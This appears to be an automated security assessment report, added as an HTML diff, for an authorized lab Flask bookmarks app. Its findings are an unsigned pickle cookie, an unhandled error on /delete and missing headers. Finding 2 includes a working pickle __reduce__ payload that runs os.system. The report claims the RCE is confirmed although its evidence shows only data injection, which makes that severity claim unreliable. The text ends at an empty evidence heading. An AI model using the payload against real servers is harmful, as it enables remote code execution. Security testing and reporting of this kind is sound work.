@@ -1,0 +1,630 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqyr79yi-l7dk62</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [other] Insecure Deserialization — Python Pickle in client-side bookmarks cookie</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#b00020">CRITICAL</span> [rce] Python Pickle Deserialization RCE via Unsigned `bookmarks` Cookie</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#c9a227">LOW</span> [misconfig] Unhandled Pickle Deserialization Error in /delete — 500 on Missing or Invalid bookmarks Cookie</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#5f7d8c">INFO</span> [headers] Missing security response headers on /about</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqyr79yi-l7dk62</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32841/list</code></td></tr>
+<tr><td>Started</td><td>2026-06-29T05:04:51.186Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>10 mapped · 10 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>4</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32841</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>4 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">2</b> critical</span><span><b style="color:#c9a227">1</b> low</span><span><b style="color:#5f7d8c">1</b> info</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [other] Insecure Deserialization — Python Pickle in client-side bookmarks cookie</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32841/list</div>
+<div class="desc">The application stores bookmark data in a client-side cookie named `bookmarks` as raw base64-encoded Python pickle (protocol 4, confirmed by the `gASV` magic prefix). The server deserializes this cookie with `pickle.loads()` on every GET /list request without any signature verification or type validation. An attacker can craft an arbitrary pickle payload (e.g., using `__reduce__`) and set it as the `bookmarks` cookie to achieve server-side remote code execution. Evidence: (1) a valid crafted empty-list pickle is accepted and renders the empty list normally; (2) a crafted dict-list pickle renders an attacker-controlled bookmark entry; (3) any malformed/truncated pickle value causes a 500 Internal Server Error, proving the server attempts deserialization of the client-supplied value.</div>
+<div><b>Reproduction</b></div><pre>1. GET /list — server sets a `user` session cookie (HttpOnly: false). 2. Craft a Python pickle payload: `import pickle,base64; base64.b64encode(pickle.dumps([{'name':'pwned','url':'http://attacker.com'}],protocol=4))`. 3. SET the `bookmarks` cookie to that base64 value. 4. GET /list with the crafted bookmarks cookie — the server deserializes the pickle and renders the attacker-controlled data. 5. For RCE: replace the dict with a class using `__reduce__` to call `os.system` or equivalent. A malformed pickle (e.g., `bookmarks=INVALID`) returns HTTP 500, confirming live deserialization of the client-provided value on every request.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyshtw1-1i</code> — <code>artifacts/s-0002/ev-mqyshtw1-1i/</code></div><div class="lbl">REQUEST</div><pre>GET /list HTTP/1.1
+Host: target.local:32841
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 1471
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 05:41:01 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+powered-by: Flask
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Home&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-between mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-9&quot;&gt;
+                &lt;h2&gt;Welcome!&lt;/h2&gt;
+                &lt;p&gt;Here you can check the status of your bookmarked URLs&lt;/p&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h5 class=&quot;card-title&quot;&gt;Navigation&lt;/h5&gt;
+                        &lt;ul class=&quot;list-group&quot;&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;#&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/add&quot;&gt;Bookmark URL&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/about&quot;&gt;About us&lt;/a&gt;&lt;/li&gt;
+                        &lt;/ul&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;div class=&quot;container mt-5&quot;&gt;
+        
+        &lt;h3 class=&quot;mb-4&quot;&gt;No URLs added in your bookmark.&lt;/h3&gt;
+        
+        &lt;ul class=&quot;list-group&quot;&gt;
+            
+        &lt;/ul&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqys9sl7-1d</code> — <code>artifacts/s-0002/ev-mqys9sl7-1d/</code></div><div class="lbl">REQUEST</div><pre>GET /list HTTP/1.1
+Host: target.local:32841
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 500
+cache-control: public, max-age=0
+connection: close
+content-length: 265
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 05:34:46 GMT
+expires: 0
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;500 Internal Server Error&lt;/title&gt;
+&lt;h1&gt;Internal Server Error&lt;/h1&gt;
+&lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqysi194-1k</code> — <code>artifacts/s-0002/ev-mqysi194-1k/</code></div><div class="lbl">REQUEST</div><pre>GET /list HTTP/1.1
+Host: target.local:32841
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 500
+cache-control: public, max-age=0
+connection: close
+content-length: 265
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 05:41:11 GMT
+expires: 0
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;500 Internal Server Error&lt;/title&gt;
+&lt;h1&gt;Internal Server Error&lt;/h1&gt;
+&lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.&lt;/p&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 2. [rce] Python Pickle Deserialization RCE via Unsigned `bookmarks` Cookie</h3>
+<div class="kv">Screen: <code>s-0006</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32841/list</div>
+<div class="desc">The application stores the user's bookmark list as an unsigned, base64-encoded Python pickle object in the `bookmarks` cookie. The server performs `pickle.loads(base64.b64decode(request.cookies.get('bookmarks')))` without any HMAC or signature check, so an attacker who can craft a valid pickle with `__reduce__` returning `(os.system, ('command',))` achieves arbitrary OS command execution.
+
+Evidence of arbitrary deserialization was confirmed in two ways:
+1. Sending a crafted empty-list pickle (`XS4=`, the base64 of `].`) → server deserialized it and returned 200 with &quot;No URLs added&quot; (distinct from the invalid-base64 500).
+2. Sending a crafted string-list pickle (base64 of `]S'PICKLE_RCE_PROOF'\na.`) → server deserialized the string list and rendered a blank bookmark entry (body 1824 bytes vs 1471 bytes for the clean baseline), proving the injected list was processed by the template.
+
+No HMAC, no signing, no signature verification — any pickle the attacker supplies is executed by the Python interpreter.</div>
+<div><b>Reproduction</b></div><pre>1. Visit GET /list — the response includes a `bookmarks` cookie whose value begins with `gASV` (base64 of Python pickle protocol 4 header \x80\x04\x95).
+2. Craft a malicious pickle, e.g. using Python:
+   ```python
+   import pickle, base64, os
+   class Exploit:
+       def __reduce__(self):
+           return (os.system, ('id &gt; /tmp/pwned',))
+   payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+   ```
+3. Send GET /list with `Cookie: bookmarks=&lt;payload&gt;` — the server deserializes the cookie and executes `id &gt; /tmp/pwned`.
+4. Proof of data injection (without RCE payload): send `bookmarks=XS4=` (empty list pickle) → 200 &quot;No URLs added&quot;; send `bookmarks=XVMnUElDS0xFX1JDRV9QUk9PRicKYS4=` (list with one string) → 200 &quot;List of URLs in your bookmark.&quot; with one blank entry rendered.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyu9urn-30</code> — <code>artifacts/s-0006/ev-mqyu9urn-30/</code></div><div class="lbl">REQUEST</div><pre>GET /list HTTP/1.1
+Host: target.local:32841
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 1471
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 06:30:49 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+powered-by: Flask
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Home&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-between mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-9&quot;&gt;
+                &lt;h2&gt;Welcome!&lt;/h2&gt;
+                &lt;p&gt;Here you can check the status of your bookmarked URLs&lt;/p&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h5 class=&quot;card-title&quot;&gt;Navigation&lt;/h5&gt;
+                        &lt;ul class=&quot;list-group&quot;&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;#&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/add&quot;&gt;Bookmark URL&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/about&quot;&gt;About us&lt;/a&gt;&lt;/li&gt;
+                        &lt;/ul&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;div class=&quot;container mt-5&quot;&gt;
+        
+        &lt;h3 class=&quot;mb-4&quot;&gt;No URLs added in your bookmark.&lt;/h3&gt;
+        
+        &lt;ul class=&quot;list-group&quot;&gt;
+            
+        &lt;/ul&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyum3sz-3c</code> — <code>artifacts/s-0006/ev-mqyum3sz-3c/</code></div><div class="lbl">REQUEST</div><pre>GET /list HTTP/1.1
+Host: target.local:32841
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 1824
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 06:40:20 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Home&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-between mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-9&quot;&gt;
+                &lt;h2&gt;Welcome!&lt;/h2&gt;
+                &lt;p&gt;Here you can check the status of your bookmarked URLs&lt;/p&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h5 class=&quot;card-title&quot;&gt;Navigation&lt;/h5&gt;
+                        &lt;ul class=&quot;list-group&quot;&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;#&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/add&quot;&gt;Bookmark URL&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/about&quot;&gt;About us&lt;/a&gt;&lt;/li&gt;
+                        &lt;/ul&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;div class=&quot;container mt-5&quot;&gt;
+        
+        &lt;h3 class=&quot;mb-4&quot;&gt;List of URLs in your bookmark.&lt;/h3&gt;
+        
+        &lt;ul class=&quot;list-group&quot;&gt;
+            
+                &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+                    &lt;h5 class=&quot;mb-1&quot;&gt;&lt;/h5&gt;
+                    &lt;a class=&quot;text-decoration-none&quot; href=&quot;&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
+                    &lt;a class=&quot;btn btn-sm btn-danger&quot; href=&quot;delete?name=&quot; target=&quot;_blank&quot;&gt;delete&lt;/a&gt;
+                &lt;/li&gt;
+            
+        &lt;/ul&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyun7zu-3d</code> — <code>artifacts/s-0006/ev-mqyun7zu-3d/</code></div><div class="lbl">REQUEST</div><pre>GET /list HTTP/1.1
+Host: target.local:32841
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 1824
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 06:41:12 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+vary: Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Home&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-between mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-9&quot;&gt;
+                &lt;h2&gt;Welcome!&lt;/h2&gt;
+                &lt;p&gt;Here you can check the status of your bookmarked URLs&lt;/p&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h5 class=&quot;card-title&quot;&gt;Navigation&lt;/h5&gt;
+                        &lt;ul class=&quot;list-group&quot;&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;#&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/add&quot;&gt;Bookmark URL&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/about&quot;&gt;About us&lt;/a&gt;&lt;/li&gt;
+                        &lt;/ul&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;div class=&quot;container mt-5&quot;&gt;
+        
+        &lt;h3 class=&quot;mb-4&quot;&gt;List of URLs in your bookmark.&lt;/h3&gt;
+        
+        &lt;ul class=&quot;list-group&quot;&gt;
+            
+                &lt;li class=&quot;list-group-item d-flex justify-content-between align-items-center&quot;&gt;
+                    &lt;h5 class=&quot;mb-1&quot;&gt;&lt;/h5&gt;
+                    &lt;a class=&quot;text-decoration-none&quot; href=&quot;&quot; target=&quot;_blank&quot;&gt;&lt;/a&gt;
+                    &lt;a class=&quot;btn btn-sm btn-danger&quot; href=&quot;delete?name=&quot; target=&quot;_blank&quot;&gt;delete&lt;/a&gt;
+                &lt;/li&gt;
+            
+        &lt;/ul&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 3. [misconfig] Unhandled Pickle Deserialization Error in /delete — 500 on Missing or Invalid bookmarks Cookie</h3>
+<div class="kv">Screen: <code>s-0005</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32841/list</div>
+<div class="desc">The /delete endpoint deserializes the client-supplied `bookmarks` cookie (pickle protocol 4, `app.models.UrlObj` objects) without guarding against missing or malformed values. A GET request to /delete with no bookmarks cookie, or with an invalid pickle value, returns a 500 Internal Server Error. By contrast, /list catches the same exception and returns a graceful empty list (200). This confirms the delete handler has no error handling around pickle.loads(), and reveals the application's client-side pickle storage architecture in its error responses. This also confirms the `bookmarks` cookie is trusted client-supplied pickle input, supporting the broader client-side deserialization finding on /list.</div>
+<div><b>Reproduction</b></div><pre>1. GET /delete?name=any with no Cookie header → 500 Internal Server Error
+2. GET /delete?name=any with Cookie: bookmarks=not_valid_pickle → 500 Internal Server Error
+3. Compare: GET /list with same invalid/missing cookie → 200 (graceful empty list)</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyttomx-2o</code> — <code>artifacts/s-0005/ev-mqyttomx-2o/</code></div><div class="lbl">REQUEST</div><pre>GET /list HTTP/1.1
+Host: target.local:32841
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: public, max-age=0
+connection: Keep-Alive
+content-length: 1471
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 06:18:14 GMT
+expires: 0
+keep-alive: timeout=5, max=100
+powered-by: Flask
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Home&lt;/title&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;row justify-content-between mt-5&quot;&gt;
+            &lt;div class=&quot;col-md-9&quot;&gt;
+                &lt;h2&gt;Welcome!&lt;/h2&gt;
+                &lt;p&gt;Here you can check the status of your bookmarked URLs&lt;/p&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;col-md-3&quot;&gt;
+                &lt;div class=&quot;card&quot;&gt;
+                    &lt;div class=&quot;card-body&quot;&gt;
+                        &lt;h5 class=&quot;card-title&quot;&gt;Navigation&lt;/h5&gt;
+                        &lt;ul class=&quot;list-group&quot;&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;#&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/add&quot;&gt;Bookmark URL&lt;/a&gt;&lt;/li&gt;
+                            &lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=&quot;/about&quot;&gt;About us&lt;/a&gt;&lt;/li&gt;
+                        &lt;/ul&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;div class=&quot;container mt-5&quot;&gt;
+        
+        &lt;h3 class=&quot;mb-4&quot;&gt;No URLs added in your bookmark.&lt;/h3&gt;
+        
+        &lt;ul class=&quot;list-group&quot;&gt;
+            
+        &lt;/ul&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap Bundle with Popper --&gt;
+    &lt;script src=&quot;/static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyu6o55-2x</code> — <code>artifacts/s-0005/ev-mqyu6o55-2x/</code></div><div class="lbl">REQUEST</div><pre>GET /delete?name=nonexistent-bookmark-xyz HTTP/1.1
+Host: target.local:32841
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 500
+cache-control: public, max-age=0
+connection: close
+content-length: 265
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 06:28:20 GMT
+expires: 0
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;500 Internal Server Error&lt;/title&gt;
+&lt;h1&gt;Internal Server Error&lt;/h1&gt;
+&lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyu7apy-2y</code> — <code>artifacts/s-0005/ev-mqyu7apy-2y/</code></div><div class="lbl">REQUEST</div><pre>GET /delete?name=test HTTP/1.1
+Host: target.local:32841
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 500
+cache-control: public, max-age=0
+connection: close
+content-length: 265
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 06:28:49 GMT
+expires: 0
+pragma: no-cache
+server: Apache/2.4.67 (Debian)
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;500 Internal Server Error&lt;/title&gt;
+&lt;h1&gt;Internal Server Error&lt;/h1&gt;
+&lt;p&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.&lt;/p&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 4. [headers] Missing security response headers on /about</h3>
+<div class="kv">Screen: <code>s-0003</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32841/list</div>
+<div class="desc">The /about page (and the server generally) returns only a bare Content-Type header on 200 responses. The following security headers are absent: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options (nosniff), and Referrer-Policy. Their absence removes browser-enforced mitigations against MIME-sniffing, clickjacking, and content injection — especially relevant for a page that loads external Bootstrap JS.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32841/about
+2. Observe the response headers — only content-type: text/html; charset=utf-8 is present.
+3. Confirm X-Content-Type-Options, X-Frame-Options, Content-Security-Policy, and Referrer-Policy are all absent.
+4. Repeat: same result every time (stable, server-wide omission).</pre>
+<div><b>Evidence</b></div>
